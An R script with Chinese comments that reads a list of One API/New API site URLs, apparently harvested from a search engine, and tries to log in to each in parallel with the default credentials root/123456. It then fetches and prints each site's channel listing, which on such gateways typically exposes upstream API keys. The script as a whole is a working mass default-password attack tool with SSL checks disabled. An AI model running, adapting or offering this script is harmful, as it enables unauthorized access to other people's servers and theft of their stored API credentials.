library(httr)
library(jsonlite)
library(furrr)
library(future)

# 设置多线程计划，使用所有可用的CPU核，这里用10个线程
plan(multisession,workers=10)

# 你的oneapi站点，不要有斜杠
url <- read.table("360-newapi",sep = "\t")%>%.$V1

# 根据网页请求模拟登录
login <- function(username, password, url=NULL) {
  data <- list(
    username = username,
    password = password
  )
  last_url <- modify_url(url, path = "/api/user/login", query = list(turnstile = ""))
  
  resp <- POST(last_url, 
               handle = handle(url),
               body = data,
               encode = "json",
               timeout(3),
               config(ssl_verifypeer = FALSE))
  
  if (status_code(resp) == 200) {
    content <- content(resp, "parsed")
    if (content$success) {
      print(paste("登录成功：", url))
    }
  }
}

# 使用safely来包装login函数，防止报错使循环中断
safe_login <- safely(login)

# 对URL列表应用并行登录函数
results <- future_map(url, ~safe_login("root", "123456", url = .), .progress = TRUE)

# 渠道函数
channel <- function(page, page_size, url=NULL) {
  last_url <- modify_url(url, path = "/api/channel/", 
                         query = list(p = page, page_size = page_size, id_sort = "false"))
  
  resp <- GET(last_url, 
              handle = handle(url),
              timeout(3),
              config(ssl_verifypeer = FALSE))
  
  if (status_code(resp) == 200) {
    content <- content(resp, "parsed")
    if (content$success) {
      print(content$data)
    }
  }
}

# 并行获取渠道信息
channel_results <- future_map(url, ~channel(1, 10, url = .), .progress = TRUE)
